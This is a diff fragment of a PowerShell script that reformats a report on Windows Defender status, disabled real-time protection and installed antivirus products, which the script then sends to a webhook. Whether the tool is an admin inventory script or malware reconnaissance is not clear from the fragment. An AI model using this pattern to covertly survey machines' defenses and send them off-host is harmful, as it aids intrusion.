@@ -154,16 +154,16 @@ try {
     }
 
     $message = @"
-    === Windows Defender Info ===
-    Service Status: $DefenderStatus
-    Real-Time Protection Disabled: $DefenderRealtime
-    Defender Executable Found: $DefenderExeStatus
-    Defender Registered in Registry: $RegStatus
-    Installed Antivirus Products (Security Center):
+ === Windows Defender Info ===
+Service Status: $DefenderStatus
+Real-Time Protection Disabled: $DefenderRealtime
+Defender Executable Found: $DefenderExeStatus
+Defender Registered in Registry: $RegStatus
+Installed Antivirus Products (Security Center):
     $avInfo
-    Installed Antivirus Products (By Path):
+Installed Antivirus Products (By Path):
     $pathAVsInfo
-    "@
+"@
 
     try {
         Send-WebhookMessage -Message $message
